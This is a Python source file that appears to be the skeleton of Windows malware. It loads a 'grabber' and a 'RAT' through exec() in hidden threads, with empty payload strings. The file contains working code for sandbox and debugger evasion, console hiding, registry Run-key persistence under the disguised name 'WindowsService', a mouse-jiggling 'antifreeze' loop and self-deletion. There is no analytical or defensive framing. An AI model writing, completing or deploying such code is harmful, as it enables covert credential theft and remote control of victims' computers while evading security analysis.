import os, sys, subprocess, threading, time, ctypes, random, winreg, tempfile, base64, hashlib

GRABBER_CODE = ""
RAT_CODE = ""

def is_sandbox():
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3:
            return True
        if psutil.cpu_count() < 2:
            return True
    except:
        pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    return False

if is_sandbox():
    time.sleep(600)
    sys.exit(0)

def run_grabber():
    try:
        exec(GRABBER_CODE)
    except:
        pass

def run_rat():
    try:
        exec(RAT_CODE)
    except:
        pass

def add_persistence():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
    except:
        pass

def self_destruct():
    try:
        if os.path.exists(sys.argv[0]):
            os.remove(sys.argv[0])
    except:
        pass

def antifreeze():
    while True:
        time.sleep(60)
        try:
            import pyautogui
            pyautogui.moveTo(random.randint(0, 100), random.randint(0, 100), duration=0.1)
            pyautogui.moveTo(random.randint(0, 100), random.randint(0, 100), duration=0.1)
        except:
            pass

if __name__ == "__main__":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    try:
        add_persistence()
        
        t1 = threading.Thread(target=run_grabber, daemon=True)
        t1.start()
        time.sleep(3)
        
        t2 = threading.Thread(target=run_rat, daemon=True)
        t2.start()
        
        threading.Thread(target=antifreeze, daemon=True).start()
        threading.Thread(target=self_destruct, daemon=True).start()
    except:
        pass
    
    while True:
        time.sleep(60)